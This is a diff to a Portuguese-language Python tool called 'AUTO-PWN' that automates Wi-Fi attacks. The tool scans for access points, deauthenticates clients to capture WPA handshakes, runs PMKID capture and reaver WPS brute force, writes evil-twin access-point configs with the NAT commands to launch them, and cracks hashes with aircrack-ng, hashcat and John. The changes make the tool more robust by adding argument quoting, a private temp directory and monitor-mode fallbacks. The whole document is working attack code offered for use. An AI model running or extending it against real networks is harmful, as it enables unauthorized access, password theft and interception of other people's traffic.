@@ -10,7 +10,7 @@ AUTO-PWN  –  plug-and-Pwn rev. 2026-01-20
 NÃO toca em wlan0 – seu Wi-Fi interno continua on-line (a menos que voce selecione).
 """
 
-import os, sys, time, subprocess, signal, re, threading, json
+import os, sys, time, subprocess, signal, re, threading, json, shlex, tempfile, shutil
 from collections import defaultdict
 from datetime import datetime
 import argparse
@@ -20,6 +20,31 @@ DEAUTH_BURST = 3
 DEAUTH_INTERVAL_SEC = 1
 CAPTURE_POST_DEAUTH_SEC = 25
 SCAN_DURATION = 15
+
+# Global temp directory for this run
+import tempfile
+import atexit
+import shutil
+import shlex
+
+TEMP_DIR = tempfile.mkdtemp(prefix="autopwn_")
+active_iface = None
+
+def cleanup_temp():
+    try:
+        shutil.rmtree(TEMP_DIR)
+    except:
+        pass
+    try:
+        if active_iface:
+            shell(f"ip link set {shlex.quote(active_iface)} down")
+            shell(f"iw dev {shlex.quote(active_iface)} set type managed 2>/dev/null || iwconfig {shlex.quote(active_iface)} mode managed 2>/dev/null")
+            shell(f"ip link set {shlex.quote(active_iface)} up")
+            shell(f"nmcli device set {shlex.quote(active_iface)} managed yes 2>/dev/null")
+    except:
+        pass
+
+atexit.register(cleanup_temp)
 
 # ---------- helpers ----------
 def shell(cmd, timeout=None):
@@ -32,17 +57,33 @@ def shell(cmd, timeout=None):
 
 def get_wireless_ifaces():
     """Retorna lista de interfaces wireless disponiveis"""
+    ifaces = set()
+
+    # Method 1: iw dev
     result = shell("iw dev 2>/dev/null")
-    if not result or result.returncode != 0:
-        return []
-    ifaces = []
-    for line in result.stdout.splitlines():
-        line = line.strip()
-        if line.startswith("Interface "):
-            iface = line.split("Interface ", 1)[1].strip()
-            if iface:
-                ifaces.append(iface)
-    return ifaces
+    if result and result.returncode == 0:
+        for line in result.stdout.splitlines():
+            line = line.strip()
+            if line.startswith("Interface "):
+                iface = line.split("Interface ", 1)[1].strip()
+                if iface:
+                    ifaces.add(iface)
+
+    # Method 2: /sys/class/net/ (check for wireless directory)
+    if os.path.exists('/sys/class/net/'):
+        for d in os.listdir('/sys/class/net/'):
+            if os.path.exists(f'/sys/class/net/{d}/wireless'):
+                ifaces.add(d)
+
+    # Method 3: /proc/net/wireless
+    if os.path.exists('/proc/net/wireless'):
+        with open('/proc/net/wireless', 'r') as w:
+            for line in w.readlines()[2:]:
+                iface = line.split(':')[0].strip()
+                if iface:
+                    ifaces.add(iface)
+
+    return list(ifaces)
 
 def choose_interface():
     """Permite escolher a interface wireless"""
@@ -76,21 +117,47 @@ def nm_unmanage(iface):
     shell(f"nmcli device set {iface} managed no 2>/dev/null")
 
 def start_mon(iface):
-    """Coloca iface em modo monitor conservando wlan0"""
+    """Coloca iface em modo monitor conservando wlan0. Retorna o nome da interface em modo monitor."""
     print(f"[+] Preparing {iface} …")
     shell(f"ip link set {iface} down")
-    shell(f"iw dev {iface} set type monitor")
-    shell(f"ip link set {iface} up")
-    # verifica
+
+    # Tenta com iw primeiro (padrão)
+    r1 = shell(f"iw dev {iface} set type monitor")
+
+    # Verifica se funcionou
     r = shell(f"iw dev {iface} info | grep type")
-    if "monitor" not in r.stdout:
-        sys.exit("[-] Failed to enter monitor mode")
+    if r and "monitor" not in r.stdout:
+        print("[!] 'iw' falhou. Tentando com 'iwconfig' (modo compatibilidade)...")
+        shell(f"iwconfig {iface} mode monitor")
+        r = shell(f"iw dev {iface} info | grep type")
+        if r and "monitor" not in r.stdout:
+            # Ultimo fallback airmon-ng se existir
+            if shell("which airmon-ng").returncode == 0:
+                print("[!] 'iwconfig' falhou. Tentando com 'airmon-ng'...")
+                shell(f"airmon-ng start {iface}")
+
+    shell(f"ip link set {iface} up")
+
+    r = shell(f"iw dev {iface} info | grep type")
+    # if it still failed and airmon didn't change name
+    if r and "monitor" not in r.stdout:
+        # Check if airmon created a mon interface
+        ifaces = get_wireless_ifaces()
+        mon_ifaces = [i for i in ifaces if "mon" in i or "prism" in i]
+        if mon_ifaces:
+             new_iface = mon_ifaces[0]
+             print(f"[+] airmon-ng criou a interface {new_iface}")
+             iface = new_iface
+        else:
+             sys.exit("[-] Failed to enter monitor mode. Seu adaptador suporta modo monitor?")
     
     # Verifica canal
     r = shell(f"iw dev {iface} info | grep channel")
     print(f"[+] Interface {iface} em modo monitor")
     if r and r.stdout:
         print(f"[+] Canal atual: {r.stdout.strip()}")
+
+    return iface
 
 def check_channel(iface, target_channel):
     """Verifica e ajusta canal se necessário"""
@@ -116,8 +183,8 @@ def scan(iface):
     print(f"[+] Scanning for APs and clients … ({SCAN_DURATION} s)")
     
     # Limpa arquivos antigos
-    for f in ("/tmp/airodump.csv", "/tmp/airodump-01.csv", 
-              "/tmp/airodump-01.kismet.csv", "/tmp/airodump-01.kismet.netxml"):
+    for f in (f"{TEMP_DIR}/airodump.csv", f"{TEMP_DIR}/airodump-01.csv",
+              f"{TEMP_DIR}/airodump-01.kismet.csv", f"{TEMP_DIR}/airodump-01.kismet.netxml"):
         try:
             os.remove(f)
         except FileNotFoundError:
@@ -125,7 +192,7 @@ def scan(iface):
     
     # Usa airodump com formato kismet para melhor parsing
     proc = subprocess.Popen(
-        ["airodump-ng", "-w", "/tmp/airodump",
+        ["airodump-ng", "-w", f"{TEMP_DIR}/airodump",
          "--output-format", "csv,kismet", iface],
         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
         text=True, bufsize=1
@@ -138,8 +205,8 @@ def scan(iface):
     def monitor_clients():
         while proc.poll() is None:
             time.sleep(2)
-            if os.path.exists("/tmp/airodump-01.csv"):
-                clients = parse_clients("/tmp/airodump-01.csv")
+            if os.path.exists(f"{TEMP_DIR}/airodump-01.csv"):
+                clients = parse_clients(f"{TEMP_DIR}/airodump-01.csv")
                 for bssid in clients:
                     client_counts[bssid] = max(client_counts[bssid], len(clients[bssid]))
     
@@ -164,10 +231,10 @@ def scan(iface):
     print("")  # Nova linha após os pontos
     monitor_thread.join(timeout=2)
     
-    if not os.path.exists("/tmp/airodump-01.csv"):
+    if not os.path.exists(f"{TEMP_DIR}/airodump-01.csv"):
         sys.exit("[-] Scan failed – no CSV")
     
-    aps = parse_csv("/tmp/airodump-01.csv")
+    aps = parse_csv(f"{TEMP_DIR}/airodump-01.csv")
     
     # Adiciona contagem de clientes a cada AP
     enriched_aps = []
@@ -268,7 +335,7 @@ def check_clients_live(iface, bssid, channel, timeout=10):
     check_channel(iface, channel)
     
     # Arquivo temporário para captura rápida
-    temp_file = f"/tmp/check_clients_{int(time.time())}"
+    temp_file = f"{TEMP_DIR}/check_clients_{int(time.time())}"
     
     # Executa airodump por tempo limitado
     proc = subprocess.Popen(
@@ -406,7 +473,7 @@ def capture(iface, bssid, ch, essid):
     # Garante que está no canal correto
     check_channel(iface, ch)
     
-    capfile = f"/tmp/{essid.replace(' ', '_').replace('/', '_') if essid else 'hidden'}_{int(time.time())}"
+    capfile = f"{TEMP_DIR}/{essid.replace(' ', '_').replace('/', '_') if essid else 'hidden'}_{int(time.time())}"
     print(f"\n[+] Iniciando captura...")
     
     # Dump em background
@@ -464,7 +531,7 @@ def capture(iface, bssid, ch, essid):
         return None
     
     print(f"[+] Verificando handshake no arquivo: {cap}")
-    r = shell(f"aircrack-ng {cap} 2>/dev/null | grep -E '(1 handshake|0 handshake)'")
+    r = shell(f"aircrack-ng {shlex.quote(str(cap))} 2>/dev/null | grep -E '(1 handshake|0 handshake)'")
     
     if r and "1 handshake" in r.stdout:
         print("[+] ✓ HANDHSHAKE CAPTURADO COM SUCESSO!")
@@ -474,7 +541,7 @@ def capture(iface, bssid, ch, essid):
         
         # Verifica novamente com pyrit (mais preciso)
         if os.path.exists("/usr/bin/pyrit"):
-            r = shell(f"pyrit -r {cap} analyze 2>/dev/null")
+            r = shell(f"pyrit -r {shlex.quote(str(cap))} analyze 2>/dev/null")
             if r and "good" in r.stdout.lower():
                 print("[+] Pyrit detectou handshake válido!")
                 return cap
@@ -501,21 +568,21 @@ def execute_pmkid_attack(iface, bssid, essid, channel):
     print("\n[+] Preparando ataque PMKID...")
     
     # Cria arquivo com o BSSID alvo
-    with open("/tmp/ap.list", "w") as f:
+    with open(f"{TEMP_DIR}/ap.list", "w") as f:
         f.write(f"{bssid}\n")
     
-    output_file = f"/tmp/pmkid_{essid.replace(' ', '_')}_{int(time.time())}"
+    output_file = f"{TEMP_DIR}/pmkid_{essid.replace(' ', '_')}_{int(time.time())}"
     
     # Detecta versão
     version = get_hcxdumptool_version()
     
     if version == "new":
-        cmd = f"hcxdumptool -i {iface} --filtermode=2 --filterlist=/tmp/ap.list -o {output_file}.pcapng --enable_status=1"
+        cmd = f"hcxdumptool -i {iface} --filtermode=2 --filterlist={TEMP_DIR}/ap.list -o {output_file}.pcapng --enable_status=1"
     elif version == "old":
-        cmd = f"hcxdumptool -i {iface} -o {output_file}.pcapng --enable_status=1 --filterlist_ap=/tmp/ap.list"
+        cmd = f"hcxdumptool -i {iface} -o {output_file}.pcapng --enable_status=1 --filterlist_ap={TEMP_DIR}/ap.list"
     else:
         print("[!] Versão do hcxdumptool não detectada, tentando sintaxe padrão...")
-        cmd = f"hcxdumptool -i {iface} --filtermode=2 --filterlist=/tmp/ap.list -o {output_file}.pcapng --enable_status=1"
+        cmd = f"hcxdumptool -i {iface} --filtermode=2 --filterlist={TEMP_DIR}/ap.list -o {output_file}.pcapng --enable_status=1"
     
     print(f"\n[+] Comando detectado: {cmd}")
     print("[+] Iniciando captura PMKID...")
@@ -565,8 +632,8 @@ def process_file_conversion(output_file, essid):
         return False
     
     print(f"[+] Convertendo com {convert_tool}...")
-    convert_cmd = f"{convert_tool} -o {output_file}.hc22000 {pcap_file}"
-    os.system(convert_cmd)
+    convert_cmd = f"{shlex.quote(str(convert_tool))} -o {shlex.quote(str(output_file))}.hc22000 {shlex.quote(str(pcap_file))}"
+    subprocess.run(convert_cmd, shell=True)
     
     hc22000_file = f"{output_file}.hc22000"
     if os.path.exists(hc22000_file) and os.path.getsize(hc22000_file) > 0:
@@ -691,10 +758,10 @@ def show_bruteforce_menu(iface, bssid, essid, channel, clients):
         print("        ┌─────────────────────────────────────────────────────────┐")
         print("        │ 1. Capturar PMKID (10-60 min):                          │")
         print(f"        │    hcxdumptool -i {iface} --filtermode=2 \\              │")
-        print("        │        --filterlist=/tmp/ap.list -o /tmp/pmkid.pcapng   │")
+        print(f"        │        --filterlist={TEMP_DIR}/ap.list -o {TEMP_DIR}/pmkid.pcapng   │")
         print("        │                                                        │")
         print("        │ 2. Converter para hashcat:                              │")
-        print("        │    hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid.pcapng│")
+        print(f"        │    hcxpcapngtool -o {TEMP_DIR}/pmkid.hc22000 {TEMP_DIR}/pmkid.pcapng│")
         print("        └─────────────────────────────────────────────────────────┘")
     else:
         print("    ❌ FERRAMENTAS NÃO INSTALADAS")
@@ -803,15 +870,15 @@ def execute_bruteforce_method(choice, iface, bssid, essid, channel, wps_tools):
             mode = input("\nEscolha [1-2]: ").strip()
             
             if mode == "1":
-                cmd = f"reaver -i {iface} -b {bssid} -c {channel} -K 1 -vv"
+                cmd = f"reaver -i {shlex.quote(str(iface))} -b {shlex.quote(str(bssid))} -c {shlex.quote(str(channel))} -K 1 -vv"
             else:
-                cmd = f"reaver -i {iface} -b {bssid} -c {channel} -vv"
+                cmd = f"reaver -i {shlex.quote(str(iface))} -b {shlex.quote(str(bssid))} -c {shlex.quote(str(channel))} -vv"
             
             print(f"\n[+] Executando: {cmd}")
             print("[!] Pode levar de 2 minutos a 10 horas")
             print("[!] Pressione Ctrl+C para parar")
             
-            os.system(cmd)
+            subprocess.run(cmd, shell=True)
     
     elif choice == "2":  # PMKID
         execute_pmkid_attack(iface, bssid, essid, channel)
@@ -834,8 +901,8 @@ def execute_bruteforce_method(choice, iface, bssid, essid, channel, wps_tools):
         print(f"\n[+] Usando wordlist: {wordlist}")
         
         if shell("which wifite").returncode == 0:
-            cmd = f"wifite --dict {wordlist} --kill --nodeauths"
-            os.system(cmd)
+            cmd = f"wifite --dict {shlex.quote(str(wordlist))} --kill --nodeauths"
+            subprocess.run(cmd, shell=True)
         else:
             print("[-] Wifite não instalado")
             print("[+] Instale: sudo apt install wifite")
@@ -844,13 +911,13 @@ def execute_bruteforce_method(choice, iface, bssid, essid, channel, wps_tools):
         print("\n[+] Iniciando captura passiva...")
         print("[+] Deixe rodando por horas/dias")
         
-        output_file = f"/tmp/passive_{essid.replace(' ', '_')}_{int(time.time())}"
-        cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {output_file} {iface}"
+        output_file = f"{TEMP_DIR}/passive_{essid.replace(' ', '_')}_{int(time.time())}"
+        cmd = f"airodump-ng -c {shlex.quote(str(channel))} --bssid {shlex.quote(str(bssid))} -w {shlex.quote(str(output_file))} {shlex.quote(str(iface))}"
         
         print(f"\n[+] Executando: {cmd}")
         print("[!] Deixe rodando em segundo plano")
         
-        os.system(cmd)
+        subprocess.run(cmd, shell=True)
     
     return False
 
@@ -861,7 +928,7 @@ def create_evil_twin_configs(iface, essid, bssid, channel):
     # Configuração hostapd
     hostapd_conf = f"""# Evil Twin Configuration for {essid}
 interface={iface}
-driver=nl80211
+# driver=nl80211 (removido para compatibilidade universal)
 ssid={essid}
 hw_mode=g
 channel={channel}
@@ -875,7 +942,7 @@ wpa_pairwise=TKIP
 rsn_pairwise=CCMP
 """
     
-    with open("/tmp/hostapd_eviltwin.conf", "w") as f:
+    with open(f"{TEMP_DIR}/hostapd_eviltwin.conf", "w") as f:
         f.write(hostapd_conf)
     
     # Configuração dnsmasq
@@ -891,19 +958,19 @@ listen-address=127.0.0.1
 no-hosts
 """
     
-    with open("/tmp/dnsmasq_eviltwin.conf", "w") as f:
+    with open(f"{TEMP_DIR}/dnsmasq_eviltwin.conf", "w") as f:
         f.write(dnsmasq_conf)
     
     print(f"\n[✅] ARQUIVOS CRIADOS:")
-    print(f"    • /tmp/hostapd_eviltwin.conf")
-    print(f"    • /tmp/dnsmasq_eviltwin.conf")
+    print(f"    • {TEMP_DIR}/hostapd_eviltwin.conf")
+    print(f"    • {TEMP_DIR}/dnsmasq_eviltwin.conf")
     
     print(f"\n[⚙️] COMANDOS PARA EXECUTAR (termiais separados):")
     print(f"\n📡 Terminal 1 - Access Point Falso:")
-    print(f"    sudo hostapd /tmp/hostapd_eviltwin.conf")
+    print(f"    sudo hostapd {TEMP_DIR}/hostapd_eviltwin.conf")
     
     print(f"\n🌐 Terminal 2 - Servidor DHCP/DNS:")
-    print(f"    sudo dnsmasq -C /tmp/dnsmasq_eviltwin.conf -d")
+    print(f"    sudo dnsmasq -C {TEMP_DIR}/dnsmasq_eviltwin.conf -d")
     
     print(f"\n🔄 Terminal 3 - Roteamento e NAT:")
     print(f"    sudo sysctl -w net.ipv4.ip_forward=1")
@@ -934,11 +1001,11 @@ def run_aircrack(cap, bssid):
         print(f"\n[+] Executando aircrack-ng com: {wl}")
         print("[!] Pode demorar... Pressione Ctrl+C para parar")
         
-        cmd = f"aircrack-ng -w '{wl}' -b '{bssid}' '{cap}'"
+        cmd = f"aircrack-ng -w {shlex.quote(str(wl))} -b {shlex.quote(str(bssid))} {shlex.quote(str(cap))}"
         print(f"[▶️] Comando: {cmd}")
         
         try:
-            os.system(cmd)
+            subprocess.run(cmd, shell=True)
         except KeyboardInterrupt:
             print("\n[⏹️] Aircrack interrompido pelo usuário")
     else:
@@ -950,14 +1017,14 @@ def run_hashcat_conversion(cap, essid, bssid):
     print("[+] Convertendo para formatos hashcat...")
     
     safe_essid = essid.replace(' ', '_').replace('/', '_')[:30]
-    base_name = f"/tmp/hs_{safe_essid}_{int(time.time())}"
+    base_name = f"{TEMP_DIR}/hs_{safe_essid}_{int(time.time())}"
     
     success = False
     
     # Método 1: aircrack-ng para hccapx
     print("\n[1/4] Tentando conversão para hccapx (aircrack-ng)...")
     hccapx_file = f"{base_name}.hccapx"
-    result = shell(f"aircrack-ng '{cap}' -J '{base_name}_hccapx' 2>&1")
+    result = shell(f"aircrack-ng {shlex.quote(str(cap))} -J {shlex.quote(str(base_name) + '_hccapx')} 2>&1")
     
     if os.path.exists(hccapx_file) and os.path.getsize(hccapx_file) > 0:
         print(f"[✅] hccapx criado: {hccapx_file}")
@@ -969,7 +1036,7 @@ def run_hashcat_conversion(cap, essid, bssid):
     print("\n[2/4] Tentando conversão com cap2hccapx...")
     if shell("which cap2hccapx").returncode == 0:
         hccapx_file2 = f"{base_name}_cap2.hccapx"
-        result = shell(f"cap2hccapx '{cap}' '{hccapx_file2}' 2>&1")
+        result = shell(f"cap2hccapx {shlex.quote(str(cap))} {shlex.quote(str(hccapx_file2))} 2>&1")
         if os.path.exists(hccapx_file2) and os.path.getsize(hccapx_file2) > 0:
             print(f"[✅] cap2hccapx criou: {hccapx_file2}")
             hccapx_file = hccapx_file2
@@ -979,7 +1046,7 @@ def run_hashcat_conversion(cap, essid, bssid):
     print("\n[3/4] Tentando conversão para hc22000 (hcxpcapngtool)...")
     hc22000_file = f"{base_name}.hc22000"
     if shell("which hcxpcapngtool").returncode == 0:
-        result = shell(f"hcxpcapngtool -o '{hc22000_file}' '{cap}' 2>&1")
+        result = shell(f"hcxpcapngtool -o {shlex.quote(str(hc22000_file))} {shlex.quote(str(cap))} 2>&1")
         if os.path.exists(hc22000_file) and os.path.getsize(hc22000_file) > 0:
             print(f"[✅] hc22000 criado: {hc22000_file}")
             success = True
@@ -987,7 +1054,7 @@ def run_hashcat_conversion(cap, essid, bssid):
     if not success:
         print("\n[❌] Todas as conversões falharam")
         print("[💡] Tente manualmente:")
-        print(f"    aircrack-ng {cap} -J /tmp/teste")
+        print(f"    aircrack-ng {cap} -J {TEMP_DIR}/teste")
         return False
     
     print("\n" + "="*80)
@@ -1068,7 +1135,7 @@ def run_hashcat_now(created_files):
                 wl = input("Digite o caminho completo: ").strip()
         
         if os.path.exists(wl):
-            cmd = f"hashcat -m {hashcat_mode} -a 0 '{hash_file}' '{wl}'"
+            cmd = f"hashcat -m {hashcat_mode} -a 0 {shlex.quote(str(hash_file))} {shlex.quote(str(wl))}"
         else:
             print(f"[-] Wordlist não existe: {wl}")
             return
@@ -1078,14 +1145,14 @@ def run_hashcat_now(created_files):
         if not length:
             length = "8"
         mask = "?d" * int(length)
-        cmd = f"hashcat -m {hashcat_mode} -a 3 '{hash_file}' {mask}"
+        cmd = f"hashcat -m {hashcat_mode} -a 3 {shlex.quote(str(hash_file))} {shlex.quote(str(mask))}"
     
     elif attack_mode == "3":
         length = input("Comprimento [8]: ").strip()
         if not length:
             length = "8"
         mask = "?l" * int(length)
-        cmd = f"hashcat -m {hashcat_mode} -a 3 '{hash_file}' {mask}"
+        cmd = f"hashcat -m {hashcat_mode} -a 3 {shlex.quote(str(hash_file))} {shlex.quote(str(mask))}"
     
     else:
         print("[-] Opção inválida")
@@ -1095,7 +1162,7 @@ def run_hashcat_now(created_files):
     print("[!] Pressione Ctrl+C para parar completamente")
     
     try:
-        os.system(cmd)
+        subprocess.run(cmd, shell=True)
     except KeyboardInterrupt:
         print("\n[⏹️] Hashcat interrompido pelo usuário")
 
@@ -1112,19 +1179,19 @@ def run_john(cap, essid, bssid):
     
     # Converte para formato John
     safe_essid = essid.replace(' ', '_').replace('/', '_')[:30]
-    john_file = f"/tmp/john_{safe_essid}_{int(time.time())}"
+    john_file = f"{TEMP_DIR}/john_{safe_essid}_{int(time.time())}"
     
     print("\n[+] Convertendo para formato John...")
     
     # Tenta converter com wpapcap2john
     if shell("which wpapcap2john").returncode == 0:
-        result = shell(f"wpapcap2john '{cap}' > '{john_file}' 2>&1")
+        result = shell(f"wpapcap2john {shlex.quote(str(cap))} > {shlex.quote(str(john_file))} 2>&1")
     elif shell("which cap2hccapx").returncode == 0:
         # Converte para hccapx primeiro
         hccapx_file = f"{john_file}.hccapx"
-        result = shell(f"cap2hccapx '{cap}' '{hccapx_file}' 2>&1")
+        result = shell(f"cap2hccapx {shlex.quote(str(cap))} {shlex.quote(str(hccapx_file))} 2>&1")
         if os.path.exists(hccapx_file):
-            result = shell(f"hccap2john '{hccapx_file}' > '{john_file}' 2>&1")
+            result = shell(f"hccap2john {shlex.quote(str(hccapx_file))} > {shlex.quote(str(john_file))} 2>&1")
     else:
         print("[-] Não foi possível converter para formato John")
         print("[+] Instale john com suporte a WiFi: sudo apt install john wpapcap2john")
@@ -1154,9 +1221,9 @@ def run_john(cap, essid, bssid):
         return False
     
     if john_mode == "1":
-        cmd = f"john --wordlist='{wl}' '{john_file}'"
+        cmd = f"john --wordlist={shlex.quote(str(wl))} {shlex.quote(str(john_file))}"
     elif john_mode == "2":
-        cmd = f"john --wordlist='{wl}' --rules '{john_file}'"
+        cmd = f"john --wordlist={shlex.quote(str(wl))} --rules {shlex.quote(str(john_file))}"
     elif john_mode == "3":
         print("\n[?] Modo incremental:")
         print("    1) Dígitos (0-9)")
@@ -1165,27 +1232,27 @@ def run_john(cap, essid, bssid):
         
         inc_mode = input("Escolha [1-3]: ").strip()
         if inc_mode == "1":
-            cmd = f"john --incremental:digits '{john_file}'"
+            cmd = f"john --incremental:digits {shlex.quote(str(john_file))}"
         elif inc_mode == "2":
-            cmd = f"john --incremental:alpha '{john_file}'"
+            cmd = f"john --incremental:alpha {shlex.quote(str(john_file))}"
         else:
-            cmd = f"john --incremental:alnum '{john_file}'"
+            cmd = f"john --incremental:alnum {shlex.quote(str(john_file))}"
     elif john_mode == "4":
-        cmd = f"john --single '{john_file}'"
+        cmd = f"john --single {shlex.quote(str(john_file))}"
     else:
-        cmd = f"john --wordlist='{wl}' '{john_file}'"
+        cmd = f"john --wordlist={shlex.quote(str(wl))} {shlex.quote(str(john_file))}"
     
     print(f"\n[▶️] Executando: {cmd}")
     print("[!] John pode demorar... Pressione Ctrl+C para parar")
     print("[💡] Para mostrar senhas encontradas: john --show '{john_file}'")
     
     try:
-        os.system(cmd)
+        subprocess.run(cmd, shell=True)
         
         # Mostra resultados se encontrou algo
         print("\n[+] Verificando senhas encontradas...")
-        show_cmd = f"john --show '{john_file}'"
-        os.system(show_cmd)
+        show_cmd = f"john --show {shlex.quote(str(john_file))}"
+        subprocess.run(show_cmd, shell=True)
         
     except KeyboardInterrupt:
         print("\n[⏹️] John interrompido pelo usuário")
@@ -1255,11 +1322,11 @@ def save_and_exit(cap, essid, bssid):
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     safe_essid = essid.replace(' ', '_').replace('/', '_')[:30]
     
-    save_dir = f"/tmp/wifi_crack_{safe_essid}_{timestamp}"
+    save_dir = f"{TEMP_DIR}/wifi_crack_{safe_essid}_{timestamp}"
     os.makedirs(save_dir, exist_ok=True)
     
     cap_dest = f"{save_dir}/handshake.cap"
-    shell(f"cp '{cap}' '{cap_dest}'")
+    shell(f"cp {shlex.quote(str(cap))} {shlex.quote(str(cap_dest))}")
     
     print(f"[📁] Arquivos salvos em: {save_dir}")
     print(f"[📄] Handshake: {cap_dest}")
@@ -1269,13 +1336,13 @@ def save_and_exit(cap, essid, bssid):
     
     if shell("which cap2hccapx").returncode == 0:
         hccapx_file = f"{save_dir}/handshake.hccapx"
-        shell(f"cap2hccapx '{cap_dest}' '{hccapx_file}' 2>/dev/null")
+        shell(f"cap2hccapx {shlex.quote(str(cap_dest))} {shlex.quote(str(hccapx_file))} 2>/dev/null")
         if os.path.exists(hccapx_file):
             print(f"[✅] HCCAPX: {hccapx_file}")
     
     if shell("which hcxpcapngtool").returncode == 0:
         hc22000_file = f"{save_dir}/handshake.hc22000"
-        shell(f"hcxpcapngtool -o '{hc22000_file}' '{cap_dest}' 2>/dev/null")
+        shell(f"hcxpcapngtool -o {shlex.quote(str(hc22000_file))} {shlex.quote(str(cap_dest))} 2>/dev/null")
         if os.path.exists(hc22000_file):
             print(f"[✅] HC22000: {hc22000_file}")
     
@@ -1345,11 +1412,14 @@ def main():
         if shell(f"which {cmd}").returncode != 0:
             print(f"[-] {cmd} não encontrado. Instale com: sudo apt install aircrack-ng")
     
+    global active_iface
     iface = args.iface or choose_interface()
+    active_iface = iface
 
     kill_interfering()
     nm_unmanage(iface)
-    start_mon(iface)
+    iface = start_mon(iface)
+    active_iface = iface
     
     while True:
         print("\n" + "="*100)
@@ -1482,10 +1552,3 @@ if __name__ == "__main__":
         print(f"\n[-] Erro: {e}")
         import traceback
         traceback.print_exc()
-    finally:
-        print("\n[+] Limpando...")
-        try:
-            if 'iface' in locals() and iface:
-                shell(f"nmcli device set {iface} managed yes 2>/dev/null")
-        except:
-            pass
